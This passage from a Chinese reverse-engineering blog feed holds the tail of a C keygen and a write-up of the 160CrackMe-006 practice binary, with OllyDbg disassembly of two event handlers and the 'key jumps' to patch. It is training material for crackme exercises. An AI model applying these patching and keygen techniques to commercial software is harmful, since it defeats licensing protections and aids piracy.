class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请先输入第一位是字母的Codice以便生成标志值\n&quot;</span>);<br><span class="hljs-keyword">char</span> Codice[<span class="hljs-number">20</span>];<br>gets_s(Codice, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">int</span> FlagNumber = getFlagNumber(Codice);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入用户名\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br>OkClick(name, FlagNumber);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个程序就是需要先输入非纯数字codice生成一个标志值计算，然后再输入codice就可以了，连续两次即可。注册机那段内联汇编，实在不知道怎么用C写了…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序还是和上一个有很熟悉的画面，不愧是同一个作者做的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/03/160CrackMe-</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-006</title>
    <link href="https://b1ackie.cn/2021/08/02/160CrackMe-006/"/>
    <id>https://b1ackie.cn/2021/08/02/160CrackMe-006/</id>
    <published>2021-08-02T10:19:24.000Z</published>
    <updated>2021-08-09T10:54:13.024Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序如下看到OK是不可点击的，是一个灰色按钮。</p><p><img src="/2021/08/02/160CrackMe-006/1.png"></p><p>点击about查看一下，可以看到我们需要让两个按钮都消失以便可以看到Ringzer0的logo</p><p><img src="/2021/08/02/160CrackMe-006/2.png"></p><p>那么先想办法让OK变得可以点击吧。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查看壳，发现未加壳，是用Delphi写的</p><p><img src="/2021/08/02/160CrackMe-006/3.png"></p><p>使用API断点，给IsEnableWindow下断，但是发现怎么都无法断下来，说明肯定是有条件的，而当前还没有满足这个条件。</p><p>使用dedark工具帮忙查看，直接分析真的是太难找了，可以看到主要四个事件，这四个事件应该比较关键</p><p><img src="/2021/08/02/160CrackMe-006/4.png"></p><p>根据函数地址找到函数下好断点之后，查看可以发现nomechange和codicechange几乎是一样的，将两处明显的跳转更改条件使跳转失效，让程序跑起来后都会断在之前下的API断点上。那么它们都是比较关键的地方。</p><p>第一个关键跳转都是判断eax+0x47这个地址的值是否等于0，而第二个跳转都是先调用了00442A3C这个函数。</p><p>nomechange：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442E04</span>  /.  <span class="hljs-number">55</span>            push ebp                                 ;  nomeChange<br><span class="hljs-attribute">00442E05</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00442E07</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E09</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E0B</span>  |.  <span class="hljs-number">53</span>            push ebx<br><span class="hljs-attribute">00442E0C</span>  |.  <span class="hljs-number">8</span>BD<span class="hljs-number">8</span>          mov ebx,eax<br><span class="hljs-attribute">00442E0E</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442E10</span>  |.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442E11</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">9</span>B<span class="hljs-number">2</span>E<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">9</span>B<br><span class="hljs-attribute">00442E16</span>  |.  <span class="hljs-number">64</span>:FF<span class="hljs-number">30</span>       push dword ptr fs:[eax]<br><span class="hljs-attribute">00442E19</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8920</span>       mov dword ptr fs:[eax],esp<br><span class="hljs-attribute">00442E1C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> D<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>D<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442E22</span>  |.  <span class="hljs-number">8078</span> <span class="hljs-number">47</span> <span class="hljs-number">00</span>    cmp byte ptr ds:[eax+<span class="hljs-number">0</span>x<span class="hljs-number">47</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E26</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">0</span>F         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">37</span>              ;  关键跳转<span class="hljs-number">1</span><br><span class="hljs-attribute">00442E28</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442E2A</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442E30</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442E32</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442E35</span>  |.  EB <span class="hljs-number">49</span>         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">80</span><br><span class="hljs-attribute">00442E37</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442E3A</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442E40</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">7</span>B<span class="hljs-number">04</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E45</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]           ;  user<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">17276</span><br><span class="hljs-attribute">00442E48</span>  |.  <span class="hljs-number">50</span>            push eax<br><span class="hljs-attribute">00442E49</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442E4C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> DC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>DC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442E52</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">6904</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E57</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442E5A</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E5B</span>  |.  E<span class="hljs-number">8</span> DCFBFFFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>A<span class="hljs-number">3</span>C<br><span class="hljs-attribute">00442E60</span>  |.  <span class="hljs-number">84</span>C<span class="hljs-number">0</span>          test al,al<br><span class="hljs-attribute">00442E62</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">0</span>F         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">73</span>               ;  关键跳转<span class="hljs-number">2</span><br><span class="hljs-attribute">00442E64</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442E66</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442E6C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442E6E</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442E71</span>  |.  EB <span class="hljs-number">0</span>D         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">80</span><br><span class="hljs-attribute">00442E73</span>  |&gt;  <span class="hljs-number">33</span>D<span class="hljs-number">2</span>          xor edx,edx<br><span class="hljs-attribute">00442E75</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442E7B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442E7D</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]<br><span class="hljs-attribute">00442E80</span>  |&gt;  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442E82</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E83</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E84</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E85</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8910</span>       mov dword ptr fs:[eax],edx<br><span class="hljs-attribute">00442E88</span>  |.  <span class="hljs-number">68</span> A<span class="hljs-number">22</span>E<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>EA<span class="hljs-number">2</span><br><span class="hljs-attribute">00442E8D</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442E90</span>  |.  BA <span class="hljs-number">02000000</span>   mov edx,<span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">00442E95</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">4209</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>DC<br><span class="hljs-attribute">00442E9A</span>  \.  C<span class="hljs-number">3</span>            retn<br><span class="hljs-attribute">00442E9B</span>   .^ E<span class="hljs-number">9</span> D<span class="hljs-number">803</span>FCFF   jmp aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00403278</span><br><span class="hljs-attribute">00442EA0</span>   .^ EB EB         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">8</span>D<br><span class="hljs-attribute">00442EA2</span>   .  <span class="hljs-number">5</span>B            pop ebx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA3</span>   .  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA4</span>   .  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA5</span>   .  <span class="hljs-number">5</span>D            pop ebp                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA6</span>   .  C<span class="hljs-number">3</span>            retn<br><br><br></code></pre></div></td></tr></table></figure><p>codicechange：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442C78</span>  /.  <span class="hljs-number">55</span>            push ebp                                 ;  codiceChange<br><span class="hljs-attribute">00442C79</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00442C7B</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">9</span>          xor ecx,ecx<br><span class="hljs-attribute">00442C7D</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C7E</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C7F</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C80</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C81</span>  |.  <span class="hljs-number">53</span>            push ebx<br><span class="hljs-attribute">00442C82</span>  |.  <span class="hljs-number">56</span>            push esi<br><span class="hljs-attribute">00442C83</span>  |.  <span class="hljs-number">8</span>BD<span class="hljs-number">8</span>          mov ebx,eax<br><span class="hljs-attribute">00442C85</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442C87</span>  |.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442C88</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">562</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">56</span><br><span class="hljs-attribute">00442C8D</span>  |.  <span class="hljs-number">64</span>:FF<span class="hljs-number">30</span>       push dword ptr fs:[eax]<br><span class="hljs-attribute">00442C90</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8920</span>       mov dword ptr fs:[eax],esp<br><span class="hljs-attribute">00442C93</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442C96</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442C9C</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">1</span>F<span class="hljs-number">06</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CA1</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442CA4</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442CA7</span>  |.  E<span class="hljs-number">8</span> ACFCFBFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00402958</span><br><span class="hljs-attribute">00442CAC</span>  |.  <span class="hljs-number">8</span>BF<span class="hljs-number">0</span>          mov esi,eax<br><span class="hljs-attribute">00442CAE</span>  |.  <span class="hljs-number">837</span>D FC <span class="hljs-number">00</span>    cmp dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CB2</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">18</span>         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>CCC<br><span class="hljs-attribute">00442CB4</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">4</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442CB7</span>  |.  <span class="hljs-number">8</span>BC<span class="hljs-number">6</span>          mov eax,esi<br><span class="hljs-attribute">00442CB9</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">8249</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00407640</span><br><span class="hljs-attribute">00442CBE</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> F<span class="hljs-number">4</span>       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442CC1</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442CC7</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">2406</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>F<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CCC</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> D<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>D<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442CD2</span>  |.  <span class="hljs-number">8078</span> <span class="hljs-number">47</span> <span class="hljs-number">00</span>    cmp byte ptr ds:[eax+<span class="hljs-number">0</span>x<span class="hljs-number">47</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CD6</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">0</span>F         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>CE<span class="hljs-number">7</span>              ;  关键跳转<span class="hljs-number">1</span><br><span class="hljs-attribute">00442CD8</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442CDA</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442CE0</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442CE2</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442CE5</span>  |.  EB <span class="hljs-number">49</span>         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">30</span><br><span class="hljs-attribute">00442CE7</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442CEA</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442CF0</span>  |.  E<span class="hljs-number">8</span> CB<span class="hljs-number">05</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CF5</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442CF8</span>  |.  <span class="hljs-number">50</span>            push eax<br><span class="hljs-attribute">00442CF9</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">0</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>]<br><span class="hljs-attribute">00442CFC</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> DC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>DC]<br><span class="hljs-attribute">00442D02</span>  |.  E<span class="hljs-number">8</span> B<span class="hljs-number">905</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442D07</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">0</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>]<br><span class="hljs-attribute">00442D0A</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D0B</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">2</span>CFDFFFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>A<span class="hljs-number">3</span>C<br><span class="hljs-attribute">00442D10</span>  |.  <span class="hljs-number">84</span>C<span class="hljs-number">0</span>          test al,al<br><span class="hljs-attribute">00442D12</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">0</span>F         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">23</span>               ;  关键跳转<span class="hljs-number">2</span><br><span class="hljs-attribute">00442D14</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442D16</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442D1C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442D1E</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442D21</span>  |.  EB <span class="hljs-number">0</span>D         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">30</span><br><span class="hljs-attribute">00442D23</span>  |&gt;  <span class="hljs-number">33</span>D<span class="hljs-number">2</span>          xor edx,edx<br><span class="hljs-attribute">00442D25</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442D2B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442D2D</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]<br><span class="hljs-attribute">00442D30</span>  |&gt;  <span 